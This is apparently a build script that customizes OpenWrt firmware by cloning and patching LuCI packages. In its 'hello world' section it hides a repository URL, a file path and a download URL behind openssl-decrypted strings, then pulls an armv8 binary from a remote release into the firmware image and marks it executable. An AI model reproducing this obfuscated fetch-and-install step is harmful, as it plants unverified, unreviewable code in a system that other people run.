# Enter the "package" directory.
cd package

# lean
svn co https://github.com/coolsnowwolf/lede/trunk/package/lean
pushd lean
rm -rf luci-app-diskman autocore parted luci-theme-argon
[ -f luci-app-ttyd/root/etc/init.d/ttyd ] && rm luci-app-ttyd/root/etc/init.d/ttyd
[ -f luci-app-rclone/luasrc/controller/rclone.lua ] && sed -i '/firstchild/Id;s/nas/services/g' luci-app-rclone/luasrc/controller/rclone.lua
popd

# Fix FullCone NAT in Firewall
rm -rf network/config/firewall
svn co https://github.com/coolsnowwolf/lede/trunk/package/network/config/firewall network/config/firewall

# autocore
cp -avx ../../package/autocore .

# argon theme
git clone -b 18.06 https://github.com/jerrykuku/luci-theme-argon.git
sed -i '/\t\t\t\t\t\t/d;s/ \/.*$//' luci-theme-argon/luasrc/view/themes/argon/footer.htm

# ServerChan
git clone https://github.com/tty228/luci-app-serverchan

# hello world
git clone $(echo "U2FsdGVkX195Fd0+OOQwOmVDUYmwbC3DbP0L36e5Qh9rMZE8ttRzVAgjLKRaKdEcD2l7amRGTKIHHtf6jJcWk1LwFNDnWlw/vYOc6CuaClY=" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)

core=$(echo "U2FsdGVkX1+02cybV6rrqDhCCHmS43vO2d4IFASZpkcRxU9zXxx7vqLLenhaM9bQ" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)
path=$(echo "U2FsdGVkX19DAQytS7NcYxDzkCIQjT5xAEUUDv4gtS4=" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)
pushd base-files/files
mkdir -p $path
wget -qO- $(curl -sL $(echo "U2FsdGVkX18O1Z1KTmw1he1cry3QXZDHjzKLaBYso71PEZsiexBJlKNv7aripkhiIm8yRIySg6aoTvYGGgkpp5w17rCMGG8t6AuWPmDNLLs=" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2) | sed -r -n 's/.*"browser_download_url": *"(.*)".*/\1/p' | grep armv8 | head -n 1 ) | gunzip -c > $core
chmod +x $core
popd


# Return to "openwrt" directory.
cd ../

# diskman
mkdir -p package/luci-app-diskman
wget https://raw.githubusercontent.com/lisaac/luci-app-diskman/master/applications/luci-app-diskman/Makefile -O package/luci-app-diskman/Makefile
mkdir -p package/parted
wget https://raw.githubusercontent.com/lisaac/luci-app-diskman/master/Parted.Makefile -O package/parted/Makefile
